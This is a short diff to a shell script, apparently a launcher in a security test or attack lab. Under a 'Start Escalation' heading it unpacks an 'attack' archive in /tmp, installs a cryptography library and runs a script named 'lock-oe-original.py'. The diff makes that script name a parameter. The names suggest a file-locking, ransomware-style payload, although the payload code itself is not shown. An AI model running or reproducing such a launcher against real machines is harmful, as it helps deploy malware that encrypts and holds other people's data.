@@ -4,4 +4,5 @@ whoami
 echo "========== End ==========="
 
 echo "===== Start Escalation =========="
-cd /tmp && tar -xzvf /tmp/attack.tar.gz && pip3 install cryptography && cd attack && python3 ./lock-oe-original.py
+script_name="${1:-lock-oe-original.py}"  # default to original script if none provided
+cd /tmp && tar -xzvf /tmp/attack.tar.gz && pip3 install cryptography && cd attack && python3 "./${script_name}"
